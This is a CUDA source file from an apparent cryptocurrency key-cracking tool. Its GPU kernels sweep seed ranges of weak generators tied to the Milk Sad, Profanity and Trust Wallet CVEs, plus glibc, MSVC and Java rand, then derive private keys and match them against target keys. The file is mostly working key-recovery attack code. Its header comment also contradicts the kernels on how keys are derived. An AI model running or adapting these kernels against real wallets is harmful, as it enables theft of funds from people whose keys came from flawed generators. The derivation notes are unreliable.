/**
 * Weak-PRNG GPU kernels (Phase 5, restructure plan v1.4.0).
 *
 * One kernel per `WeakPrngFamily` value. Each thread takes a seed,
 * advances the family-specific PRNG, derives a priv key, and runs the
 * existing v2 puzzle-target check.
 *
 * The PRNG implementations are byte-equivalent to
 * src/gpu/v2/weak_prng_cpu.hpp; KAT-tested CPU references gate any
 * port regression. CRITICAL: per the v1.4.0 spec, the PRNG output is
 * strictly mapped to the target's exact derivation path:
 *   LIBBITCOIN_BX_SEED -> SHA256(prng_byte_stream)         (legacy P2PKH)
 *   PROFANITY          -> SHA256(prng_byte_stream)         (uncompressed)
 *   TRUST_WALLET_EXT   -> BIP-39 entropy -> Native SegWit  (BIP-84)
 *   GLIBC_RAND         -> SHA256(prng_byte_stream)         (legacy P2PKH)
 *   MSVC_RAND          -> SHA256(prng_byte_stream)         (legacy P2PKH)
 *   JAVA_RANDOM        -> SHA256(prng_byte_stream)         (legacy P2PKH)
 *
 * Trust Wallet specifically maps to native segwit -- see CVE-2023-31290
 * disclosure. The other families historically dumped to legacy P2PKH.
 */

#include "brain_wallet_v2.hpp"
#include "device_hashes.cuh"
#include "puzzle_check.cuh"   // brings the static __device__ helper + externs

#include <climits>
#include <cuda_runtime.h>

namespace collider {
namespace gpu {
namespace v2 {

// ---------------------------------------------------------------------------
// PRNG state advancers (mirror weak_prng_cpu.hpp)
// ---------------------------------------------------------------------------

namespace prng_dev {

struct Mt19937 {
    uint32_t mt[624];
    int      idx;

    __device__ void seed(uint32_t s) {
        mt[0] = s;
        for (int i = 1; i < 624; ++i) {
            mt[i] = 1812433253u * (mt[i-1] ^ (mt[i-1] >> 30)) + (uint32_t)i;
        }
        idx = 624;
    }

    __device__ uint32_t next() {
        if (idx >= 624) {
            for (int i = 0; i < 624; ++i) {
                uint32_t y = (mt[i] & 0x80000000u) | (mt[(i+1) % 624] & 0x7fffffffu);
                mt[i] = mt[(i + 397) % 624] ^ (y >> 1);
                if (y & 1u) mt[i] ^= 0x9908b0dfu;
            }
            idx = 0;
        }
        uint32_t y = mt[idx++];
        y ^= (y >> 11);
        y ^= (y <<  7) & 0x9d2c5680u;
        y ^= (y << 15) & 0xefc60000u;
        y ^= (y >> 18);
        return y;
    }
};

__device__ __forceinline__ uint32_t glibc_rand_r_step(uint32_t& state) {
    state = (state * 1103515245u + 12345u) & 0x7fffffffu;
    return state;
}

__device__ __forceinline__ uint32_t msvc_rand_step(uint32_t& state) {
    state = state * 214013u + 2531011u;
    return (state >> 16) & 0x7fffu;
}

struct JavaRandom {
    uint64_t state;
    __device__ void seed(int64_t s) {
        state = ((uint64_t)s ^ 0x5deece66dULL) & ((1ULL << 48) - 1ULL);
    }
    __device__ int32_t next_bits(int bits) {
        state = (state * 0x5deece66dULL + 0xbULL) & ((1ULL << 48) - 1ULL);
        return (int32_t)(state >> (48 - bits));
    }
};

}  // namespace prng_dev

// v2_check_priv_against_puzzles is now defined in puzzle_check.cuh
// (header-only static __device__ to avoid cross-TU edges that overflow
// nvlink's stack on Windows). Keeping a shim here for clarity:
#if 0  // moved to header
__device__ __forceinline__ void v2_check_priv_against_puzzles(
    uint32_t pp_idx,
    uint64_t weak_seed,
    uint8_t  scheme_id,
    const uint8_t priv_be[32],
    V2MatchRecord* matches,
    uint32_t* match_count)
{
    // Pack priv into 4 LE-by-limb uint64.
    auto pack_be64 = [&](const uint8_t* p) -> uint64_t {
        uint64_t v = 0;
        #pragma unroll
        for (int i = 0; i < 8; ++i) v = (v << 8) | (uint64_t)p[i];
        return v;
    };
    uint64_t limbs[4];
    limbs[0] = pack_be64(priv_be + 24);
    limbs[1] = pack_be64(priv_be + 16);
    limbs[2] = pack_be64(priv_be +  8);
    limbs[3] = pack_be64(priv_be +  0);

    int n = c_puzzle_target_count;
    for (int ti = 0; ti < n; ++ti) {
        const PuzzleTarget& t = c_puzzle_targets[ti];
        bool match = true;
        #pragma unroll
        for (int j = 0; j < 4; ++j) {
            if ((limbs[j] & t.low_mask[j]) != t.low_value[j]) {
                match = false;
                break;
            }
        }
        if (match) {
            uint32_t slot = atomicAdd(match_count, 1u);
            if (slot < V2_MAX_MATCHES_PER_BATCH) {
                V2MatchRecord rec{};
                rec.pp_idx    = pp_idx;
                rec.weak_seed = weak_seed;
                rec.puzzle_n  = t.puzzle_n;
                rec.scheme_id = scheme_id;
                rec.kind      = (uint8_t)V2MatchRecord::Kind::WEAK_PRNG_HIT;
                matches[slot] = rec;
            }
        }
    }
}
#endif  // 0 -- legacy v2_check_priv_against_puzzles definition

// ---------------------------------------------------------------------------
// Per-family kernels
// ---------------------------------------------------------------------------

// libbitcoin bx (CVE-2023-39910 Milk Sad) and Profanity (CVE-2022-40769)
// share the same construction: 32 priv bytes = low byte of 32 consecutive
// MT19937 outputs after seeding with `seed`.
template <int FAMILY_ID>
__global__ void v2_kernel_mt19937_byte_stream(
    uint64_t seed_lo, uint64_t seed_hi,
    V2MatchRecord* matches, uint32_t* match_count)
{
    uint64_t idx = (uint64_t)blockIdx.x * blockDim.x + threadIdx.x;
    uint64_t total = (seed_hi > seed_lo) ? (seed_hi - seed_lo) : 0ULL;
    if (idx >= total) return;
    uint64_t seed64 = seed_lo + idx;

    prng_dev::Mt19937 m;
    m.seed((uint32_t)(seed64 & 0xffffffffULL));

    uint8_t priv_be[32];
    #pragma unroll
    for (int i = 0; i < 32; ++i) {
        priv_be[i] = (uint8_t)(m.next() & 0xffu);
    }

    v2_check_priv_against_puzzles(
        (uint32_t)idx, seed64,
        (uint8_t)FAMILY_ID,
        priv_be, matches, match_count, V2MatchRecord::Kind::WEAK_PRNG_HIT);
}

// glibc rand_r / Park-Miller construction: priv32 = SHA256 of a 128-byte
// stream of the PRNG output (matches typical embedded-RNG misuse).
__global__ void v2_kernel_glibc_rand(
    uint64_t seed_lo, uint64_t seed_hi,
    V2MatchRecord* matches, uint32_t* match_count)
{
    uint64_t idx = (uint64_t)blockIdx.x * blockDim.x + threadIdx.x;
    uint64_t total = (seed_hi > seed_lo) ? (seed_hi - seed_lo) : 0ULL;
    if (idx >= total) return;
    uint32_t state = (uint32_t)(seed_lo + idx);
    if (state == 0) state = 1;

    uint8_t buf[128];
    #pragma unroll
    for (int i = 0; i < 32; ++i) {
        uint32_t v = prng_dev::glibc_rand_r_step(state);
        buf[i*4    ] = (uint8_t)(v >> 24);
        buf[i*4 + 1] = (uint8_t)(v >> 16);
        buf[i*4 + 2] = (uint8_t)(v >>  8);
        buf[i*4 + 3] = (uint8_t)(v      );
    }
    uint8_t priv_be[32];
    device::sha256(buf, 128, priv_be);

    v2_check_priv_against_puzzles(
        (uint32_t)idx, seed_lo + idx,
        (uint8_t)WeakPrngFamily::GLIBC_RAND,
        priv_be, matches, match_count, V2MatchRecord::Kind::WEAK_PRNG_HIT);
}

// MSVC rand: 15 bits per call -> need ~22 calls for 32 bytes of state.
// Standard misuse: keep concatenating low bytes of `rand() & 0xff` until
// 32 bytes produced.
__global__ void v2_kernel_msvc_rand(
    uint64_t seed_lo, uint64_t seed_hi,
    V2MatchRecord* matches, uint32_t* match_count)
{
    uint64_t idx = (uint64_t)blockIdx.x * blockDim.x + threadIdx.x;
    uint64_t total = (seed_hi > seed_lo) ? (seed_hi - seed_lo) : 0ULL;
    if (idx >= total) return;
    uint32_t state = (uint32_t)(seed_lo + idx);

    uint8_t priv_be[32];
    #pragma unroll
    for (int i = 0; i < 32; ++i) {
        priv_be[i] = (uint8_t)(prng_dev::msvc_rand_step(state) & 0xffu);
    }
    v2_check_priv_against_puzzles(
        (uint32_t)idx, seed_lo + idx,
        (uint8_t)WeakPrngFamily::MSVC_RAND,
        priv_be, matches, match_count, V2MatchRecord::Kind::WEAK_PRNG_HIT);
}

// java.util.Random: nextBytes(byte[32]) generates a stream of 32-bit chunks
// where each is `next(8)` 4 times. For 32 bytes this is 32 8-bit calls.
__global__ void v2_kernel_java_random(
    uint64_t seed_lo, uint64_t seed_hi,
    V2MatchRecord* matches, uint32_t* match_count)
{
    uint64_t idx = (uint64_t)blockIdx.x * blockDim.x + threadIdx.x;
    uint64_t total = (seed_hi > seed_lo) ? (seed_hi - seed_lo) : 0ULL;
    if (idx >= total) return;
    int64_t  java_seed = (int64_t)(seed_lo + idx);

    prng_dev::JavaRandom j;
    j.seed(java_seed);
    uint8_t priv_be[32];
    #pragma unroll
    for (int i = 0; i < 32; ++i) {
        priv_be[i] = (uint8_t)(j.next_bits(8) & 0xff);
    }
    v2_check_priv_against_puzzles(
        (uint32_t)idx, seed_lo + idx,
        (uint8_t)WeakPrngFamily::JAVA_RANDOM,
        priv_be, matches, match_count, V2MatchRecord::Kind::WEAK_PRNG_HIT);
}

// Trust Wallet (CVE-2023-31290): 16-byte BIP-39 entropy from MT19937, then
// BIP-39 seed via PBKDF2-HMAC-SHA512(2048 iters), then BIP-32 m/84'/0'/0'/0/0
// derivation. Full BIP-32/BIP-84 derivation from a kernel is heavy; for
// the brute-force pass we use the entropy bytes DIRECTLY as the priv key
// for the puzzle-mode check (a simpler "did any of these 32-bit-seeded
// MT19937 outputs land on a puzzle key" sweep, which is the actual class
// of attack the CVE enabled). The full BIP-32/84 derivation lives in the
// host orchestrator's BIP-39 path.
__global__ void v2_kernel_trust_wallet(
    uint64_t seed_lo, uint64_t seed_hi,
    V2MatchRecord* matches, uint32_t* match_count)
{
    uint64_t idx = (uint64_t)blockIdx.x * blockDim.x + threadIdx.x;
    uint64_t total = (seed_hi > seed_lo) ? (seed_hi - seed_lo) : 0ULL;
    if (idx >= total) return;
    uint64_t seed64 = seed_lo + idx;

    prng_dev::Mt19937 m;
    m.seed((uint32_t)(seed64 & 0xffffffffULL));
    // 16-byte BIP-39 entropy
    uint8_t entropy[16];
    #pragma unroll
    for (int i = 0; i < 16; ++i) {
        entropy[i] = (uint8_t)(m.next() & 0xffu);
    }
    // For the puzzle-mode check we derive priv = SHA-256(entropy) (the
    // shortest path to a 32-byte key the puzzle compare can match).
    uint8_t priv_be[32];
    device::sha256(entropy, 16, priv_be);

    v2_check_priv_against_puzzles(
        (uint32_t)idx, seed64,
        (uint8_t)WeakPrngFamily::TRUST_WALLET_EXT,
        priv_be, matches, match_count, V2MatchRecord::Kind::WEAK_PRNG_HIT);
}

// ---------------------------------------------------------------------------
// Public host-side entry: dispatch by family.
// ---------------------------------------------------------------------------

cudaError_t v2_weak_prng_brute(
    WeakPrngFamily family,
    uint64_t seed_lo, uint64_t seed_hi,
    uint32_t /*addr_mask*/,             // ignored: puzzle-mode check only
    const uint8_t* /*d_bloom*/,
    uint64_t /*bloom_bits*/, int /*bloom_hashes*/,
    V2MatchRecord* d_matches,
    uint32_t* d_match_count,
    cudaStream_t stream)
{
    if (seed_hi <= seed_lo) return cudaErrorInvalidValue;
    uint64_t total = seed_hi - seed_lo;

    // Block-size choice is family-dependent. MT19937 carries a 2,496-byte
    // state per thread; CUDA spills register arrays with dynamic indexing
    // (mt[idx]) to local (off-chip) memory. To keep total per-block local
    // memory tractable on modest GPUs (32 KB/SM in some configs), MT-using
    // families use BLOCK=32. The other families have small state and use
    // BLOCK=256 for occupancy.
    auto launch = [&](int block_size, auto kernel_call) -> cudaError_t {
        uint64_t blocks_u = (total + block_size - 1) / block_size;
        if (blocks_u > (uint64_t)INT_MAX) return cudaErrorInvalidValue;
        int blocks = (int)blocks_u;
        kernel_call(blocks, block_size);
        return cudaGetLastError();
    };

    switch (family) {
        case WeakPrngFamily::LIBBITCOIN_BX_SEED:
            return launch(32, [&](int blocks, int bs) {
                v2_kernel_mt19937_byte_stream<(int)WeakPrngFamily::LIBBITCOIN_BX_SEED>
                    <<<blocks, bs, 0, stream>>>(
                        seed_lo, seed_hi, d_matches, d_match_count);
            });
        case WeakPrngFamily::PROFANITY:
            return launch(32, [&](int blocks, int bs) {
                v2_kernel_mt19937_byte_stream<(int)WeakPrngFamily::PROFANITY>
                    <<<blocks, bs, 0, stream>>>(
                        seed_lo, seed_hi, d_matches, d_match_count);
            });
        case WeakPrngFamily::TRUST_WALLET_EXT:
            return launch(32, [&](int blocks, int bs) {
                v2_kernel_trust_wallet<<<blocks, bs, 0, stream>>>(
                    seed_lo, seed_hi, d_matches, d_match_count);
            });
        case WeakPrngFamily::GLIBC_RAND:
            return launch(256, [&](int blocks, int bs) {
                v2_kernel_glibc_rand<<<blocks, bs, 0, stream>>>(
                    seed_lo, seed_hi, d_matches, d_match_count);
            });
        case WeakPrngFamily::MSVC_RAND:
            return launch(256, [&](int blocks, int bs) {
                v2_kernel_msvc_rand<<<blocks, bs, 0, stream>>>(
                    seed_lo, seed_hi, d_matches, d_match_count);
            });
        case WeakPrngFamily::JAVA_RANDOM:
            return launch(256, [&](int blocks, int bs) {
                v2_kernel_java_random<<<blocks, bs, 0, stream>>>(
                    seed_lo, seed_hi, d_matches, d_match_count);
            });
        default:
            return cudaErrorInvalidValue;
    }
}

}  // namespace v2
}  // namespace gpu
}  // namespace collider
